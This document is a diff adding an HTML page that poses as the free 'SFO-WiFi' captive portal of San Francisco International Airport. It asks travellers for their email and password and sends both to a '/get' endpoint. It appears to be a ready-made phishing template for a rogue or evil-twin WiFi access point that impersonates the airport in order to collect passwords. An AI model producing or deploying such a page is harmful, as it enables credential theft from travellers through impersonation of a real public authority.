@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>SFO WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a1628;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.c{width:100%;max-width:420px;background:#0f1e35;border:1px solid #1e3050;border-radius:12px;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,0.5)}
+.h{padding:18px 22px 14px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #1e3050}
+.code{font-size:36px;font-weight:900;color:#fff;letter-spacing:2px;font-family:"Arial Narrow",Arial,sans-serif;flex-shrink:0}
+.ht .n{font-size:12px;font-weight:700;color:#c0d8f0}
+.ht .a{font-size:10px;color:#3a5070;margin-top:2px}
+.ht .l{font-size:10px;color:#2a4060;margin-top:1px}
+.bar{background:#0d1a2e;border-bottom:1px solid #1e3050;padding:7px 22px;display:flex;align-items:center;gap:8px}
+.dot{width:7px;height:7px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.25);animation:p 2s infinite}
+@keyframes p{0%,100%{box-shadow:0 0 0 0 rgba(74,222,128,0.4)}50%{box-shadow:0 0 0 5px rgba(74,222,128,0)}}
+.bar span{font-size:11px;color:#3a5070}
+.bar strong{color:#5a8098}
+.body{padding:22px}
+h2{font-size:16px;font-weight:700;color:#c0d8f0;margin-bottom:3px}
+.sub{font-size:12px;color:#3a5070;margin-bottom:16px}
+.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#3a5070;margin-bottom:6px;margin-top:16px}
+input{width:100%;padding:11px 13px;border:1px solid #1e3050;border-radius:8px;font-size:14px;background:#0a1628;color:#c0d8f0;font-family:inherit}
+input:focus{outline:none;border-color:#009B3A;box-shadow:0 0 0 3px #009B3A18}
+input::placeholder{color:#1e3050}
+.btn{width:100%;padding:12px;margin-top:18px;border:none;border-radius:8px;background:#009B3A;color:#fff;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit}
+.terms{font-size:10.5px;color:#2a4060;text-align:center;margin-top:11px;line-height:1.6}
+.terms a{color:#009B3A}
+.foot{background:#0d1a2e;border-top:1px solid #1e3050;padding:10px 22px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:10px;color:#2a4060;text-decoration:none}
+.foot a{color:#009B3A}
+</style>
+</head>
+<body>
+<div class="c">
+  <div class="h">
+    <div class="code">SFO</div>
+    <div class="ht"><div class="n">San Francisco International</div><div class="a">City & County of San Francisco</div><div class="l">San Francisco, CA</div></div>
+  </div>
+  <div class="bar"><div class="dot"></div><span>Network: <strong>SFO-WiFi</strong> &bull; Intl & Domestic</span></div>
+  <div class="body">
+    <h2>Complimentary Passenger WiFi</h2>
+    <p class="sub">Sign in to access free internet throughout the terminal.</p>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit" class="btn">Connect Now</button>
+      <p class="terms">By connecting you agree to the <a href="#">Acceptable Use Policy</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>SFO Airport WiFi</span><a href="#">Help</a></div>
+</div>
+</body>
+</html>
